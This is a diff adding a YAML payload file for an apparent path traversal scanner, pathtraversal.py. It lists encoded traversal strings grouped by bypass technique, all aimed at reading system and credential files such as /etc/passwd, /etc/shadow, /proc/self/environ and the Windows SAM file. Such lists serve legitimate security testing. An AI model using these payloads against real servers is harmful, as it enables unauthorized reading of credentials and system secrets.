@@ -1,0 +1,52 @@
+# Path Traversal Detection Payloads
+# Usado por pathtraversal.py
+
+category_map:
+  path:
+    - url_encoded
+    - double_encoded
+    - overlong_utf8
+    - overlong_3byte
+  param:
+    - param_traversal
+    - param_encoded
+    - param_json
+  semicolon:
+    - semicolon_bypass
+    - semicolon_encoded
+    - semicolon_double
+  mixed:
+    - mixed_encoding
+    - mixed_backslash
+    - tab_injection
+  platform:
+    - linux_passwd
+    - linux_proc
+    - windows_system
+
+traversal_payloads:
+  - ["url_encoded", "..%2f..%2f..%2fetc/passwd"]
+  - ["url_encoded", "..%2f..%2f..%2fproc/self/environ"]
+  - ["double_encoded", "..%252f..%252f..%252fetc/passwd"]
+  - ["double_encoded", "..%252f..%252fetc/passwd%2500"]
+  - ["overlong_utf8", "..%c0%af..%c0%afetc/passwd"]
+  - ["overlong_utf8", "..%c0%5c..%c0%5cwindows/win.ini"]
+  - ["overlong_3byte", "..%e0%80%af..%e0%80%afetc/passwd"]
+
+semicolon_payloads:
+  - ["semicolon_bypass", "..;/..;/..;/etc/passwd"]
+  - ["semicolon_encoded", "..%3b..%3b..%3betc/passwd"]
+  - ["semicolon_double", "..%253b..%253b..%253betc/passwd"]
+
+mixed_payloads:
+  - ["mixed_encoding", "..%c0%af..%252fetc/passwd"]
+  - ["mixed_backslash", "..%5c..%2fetc/passwd"]
+  - ["tab_injection", "..%09..%09..%09etc/passwd"]
+
+platform_payloads:
+  - ["linux_passwd", "..%2f..%2f..%2fetc/passwd"]
+  - ["linux_passwd", "..%2f..%2f..%2fetc/shadow"]
+  - ["linux_proc", "..%2f..%2f..%2fproc/self/environ"]
+  - ["linux_proc", "..%2f..%2f..%2fproc/self/cmdline"]
+  - ["windows_system", "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"]
+  - ["windows_system", "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"]
